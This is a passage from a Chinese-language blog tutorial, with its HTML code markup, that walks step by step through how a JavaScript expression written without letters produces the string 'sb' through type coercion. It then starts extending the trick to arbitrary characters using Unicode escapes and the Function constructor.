-4</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token operator">~</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 3</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>现在开始分析最早提到的那串代码，它的神奇之处就在于整个代码在不包括任何一个字母的情况下输出了字母，代码中都是一些运算符和操作符，代码串挨在一起不利于观察，我们先稍微格式化一下：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">(</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token punctuation">)</span><span class="token punctuation">[</span>    <span class="token operator">--</span><span class="token punctuation">[</span><span class="token operator">~</span><span class="token operator">+</span><span class="token string">''</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">*</span>     <span class="token punctuation">[</span><span class="token operator">~</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">+</span>     <span class="token operator">~</span><span class="token operator">~</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token operator">+</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">[</span>    <span class="token punctuation">[</span><span class="token operator">~</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">*</span>    <span class="token operator">~</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里只是拆分美化了一下格式，输出结果不变，然后一行一行进行分析，根据拆分结果，其实整个代码就是两大部分相加；</p><h2 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h2><p>第一部分中，第一行是 <code>(!(~+[]) + &#123;&#125;)</code>，也是两部分加和，根据前面的基础，可以得到如下分析结果：</p><pre class="line-numbers language-none"><code class="language-none">     (!(~+[]) + &#123;&#125;)            ↓     (!(~0) + &quot;[object Object]&quot;)                 ↓             (!-1 + &quot;[object Object]&quot;)            ↓            (false + &quot;[object Object]&quot;)                        ↓            (false + &quot;[object Object]&quot;)                        ↓              (&quot;false[object Object]&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第一大部分剩下的内容：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">[</span>    <span class="token operator">--</span><span class="token punctuation">[</span><span class="token operator">~</span><span class="token operator">+</span><span class="token string">''</span><span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">*</span>     <span class="token punctuation">[</span><span class="token operator">~</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">+</span>     <span class="token operator">~</span><span class="token operator">~</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>分析结果如下：</p><pre class="line-numbers language-none"><code class="language-none">--[~+&#39;&#39;][+[]]  *  [~+[]]   +  ~~!+[]      ↓             ↓           ↓        --[~0][0]    *   [~0]    +  ~~!0            ↓             ↓           ↓        --[-1][0]    *   [-1]    + ~~true            ↓                         ↓         --(-1)                      ~~1            ↓                         ↓           -2                         1     &#x3D;&gt; -2 * [-1] + 1 &#x3D; -2 * -1 + 1                 &#x3D; 3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以第一大部分的结果是：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">(</span><span class="token string">"false[object Object]"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// "s"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="第二部分"><a href="#第二部分" class="headerlink" title="第二部分"></a>第二部分</h2><p>第二大部分也执行类似的分解，第一行内容是 <code>(&#123;&#125; + [])</code>，其实也是在拼接字符串，分析如下：</p><pre class="line-numbers language-none"><code class="language-none">      (&#123;&#125; + [])                ↓      (&quot;[object Object]&quot; + &quot;&quot;)                ↓            (&quot;[object Object]&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>余下内容是：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">[</span>    <span class="token punctuation">[</span><span class="token operator">~</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">*</span>    <span class="token operator">~</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>分析如下：</p><pre class="line-numbers language-none"><code class="language-none">[~!+[]]  *  ~+[]   ↓         ↓    [~!0]   *   ~0      ↓         ↓   [~true]  *   -1      ↓         ↓     [~1]   *   -1      ↓         ↓  [-2]   *   -1          ↓             -2 * -1                ↓                2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以第二大部分结果就是：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">(</span><span class="token string">"[object Object]"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// "b"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="汇总"><a href="#汇总" class="headerlink" title="汇总"></a>汇总</h2><p>最后两个大部分内容字符串拼接就是最终结果，这里汇总一下：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">(</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token punctuation">)</span> <span class="token comment">// "false[object Object]"</span><span class="token punctuation">[</span>    <span class="token operator">--</span><span class="token punctuation">[</span><span class="token operator">~</span><span class="token operator">+</span><span class="token string">''</span><span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token comment">// -2</span>    <span class="token punctuation">[</span><span class="token operator">~</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token comment">// -1</span>    <span class="token operator">~</span><span class="token operator">~</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token comment">// 1</span><span class="token punctuation">]</span> <span class="token comment">// => ("false[object Object]")[3] => "s"</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token operator">+</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment">// [object Object]</span><span class="token punctuation">[</span>    <span class="token punctuation">[</span><span class="token operator">~</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token comment">// -2</span>    <span class="token operator">~</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token comment">// -1</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// => ("[object Object]")[2] => "b"</span><span class="token comment">// => "s" + "b" = "sb"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>费了这么大功夫就得出两个字母，想必这个过程对于理解 js 中的类型转换机制是很有帮助的；</p><h2 id="魔力所在"><a href="#魔力所在" class="headerlink" title="魔力所在"></a>魔力所在</h2><p>然后就是回顾之前那个问题，为什么整个代码没有出现字母却在结果中出现了，根据上面的分析可以看出，字符串是通过类似以下方式得到的：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// "[object Object]"</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// "true"</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// "false"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>然后在 js 中字符串也可以通过类似数组的方式获取某个字符：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"[object Objact]"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// "b"</span><span class="token comment">// "b" 在字符串中的索引为 2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>那么前面提到的输出 <code>hello world!</code> 的代码，其实也是通过类似的方式获取字符然后拼接而成，只是需要思考从哪些格式化输出中获取想要的那个字符而已；</p><h1 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h1><p>顺着上面的思路，如果我们想要输出任意指定字符，该如何实现呢？即字符中可能包含 <code>a-z, A-Z, 0-9</code> 中的任何一个字符，甚至是特殊字符；</p><h2 id="可能的输出"><a href="#可能的输出" class="headerlink" title="可能的输出"></a>可能的输出</h2><p>前面提到输出的关键是存在这个一个标准格式化输出（如 true, false），然后就能从里面扣取字符了，作者目前能想到的标准输出的字符串有如下（可能疏漏）：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// ""</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// "true"</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// "false"</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// "[object Object]"</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// "NaN"</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// "undefined"</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">~</span><span class="token operator">~</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">/</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment">// "Infinity"</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">~</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">~</span><span class="token operator">~</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// "-"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>即使这样，汇总下来的字母也只有：</p><pre class="line-numbers language-none"><code class="language-none">abcdefiIjlnNoOrstuy-<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>离目标似乎有点远~~，数字就比较好弄了：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 0</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 2（后续的数字可以这样叠加）</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token operator">~</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 2（也可以换个简短的方法）</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 3</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 4</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 5</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 6</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 7</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 8</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 9</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>更大的数字就可以通过字符拼接或者四则运算获得；</p><h2 id="扩大输出范围"><a href="#扩大输出范围" class="headerlink" title="扩大输出范围"></a>扩大输出范围</h2><p>目前还是没有获得大部分大写字母和特殊字符 <code>~!@#$%^&amp;*()_+-=\|[]&#123;&#125;;&#39;:&quot;,./&lt;&gt;?</code>，甚至是汉字或者是其他国字符，等等，说到这里是不是想起了什么？没错就是<strong>Unicode</strong>（号称万国符来着），首先 js 中使用 Unicode 的形式是 <code>&quot;\uXXXX&quot;</code>，后面的 <code>XXXX</code> 是四个十六进制字符，例如：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'\u0061'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// "a"</span><span class="token comment">// 获取 a 的字符编码</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 97</span><span class="token comment">// 转换为 16 进制</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// "61"</span><span class="token comment">// 0061 = 61</span><span class="token comment">// 汉字</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'黄'</span><span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// "9ec4"</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'\u9ec4'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// "黄"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以只要能够表示 <code>\, u, a-f, 0-9</code> 这几个字符，就能表示所有 Unicode 字符了！根据前面的总结，其实我们已经能够表示这几个字符了！不过呢，直接拼接 Unicode 的话会出现下面的问题：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'\u0061'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// "a"</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'\u'</span> <span class="token operator">+</span> <span class="token string">'0061'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// SyntaxError: Invalid Unicode escape sequence</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'\\u'</span> <span class="token operator">+</span> <span class="token string">'0061'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// "\u0061"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h3><p>所以我们不能通过直接拼接 Unicode 字符串来获得能被解析的 Unicode 符的，因此不得不换个思路；既然不能拼接直接 Unicode，那么有么有间接的方法或者 API 呢？<br>可能会想到使用 <code>eval()</code>：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> s <span class="token operator">=</span> <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">'"'</span> <span class="token operator">+</span> <span class="token string">'\\u'</span> <span class="token operator">+</span> <span class="token string">'0061'</span> <span class="token operator">+</span> <span class="token string">'"'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// "a"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>虽然成功了，但是目前我们似乎还无法获得 <code>eval</code> 中的字母 <code>v</code>，所以要继续换个方法；</p><h3 id="Function"><a href="#Function" class="headerlink" title="Function"></a>Function</h3><p>其实还有一个函数可以实现类似的功能，它就是 <code>Function()</code>，即<em>构造函数的函数</em>，也是声明函数的另一种方法，举例：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> fn <span class="token operator">=</span> <span class="token function">Function</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'return a + b'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> fn2 <span class="token operator">=</span> <span class="token function">Function</span><span class="token punctuation">(</span><span class="token string">'return 4'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">fn</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 3</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">fn2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 4</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后我们就可以像这样拼接 Unicode 了：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">Function</span><span class="token punctuation">(</span><span class="token string">'return '</span> <span class="token operator">+</span> <span class="token string">'"\\u'</span> <span class="token operator">+</span> <span class="token string">'0061'</span> <span class="token operator">+</span> <span class="token string">'"'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// "a"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>另外我们需要知道的是：<code>[][&#39;constructor&#39;][&#39;constructor&#39;] === Function</code>，所以最后只要构造出这样的字符串就行了：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'constructor'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'constructor'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'return '</span><span class="token operator">+</span><span 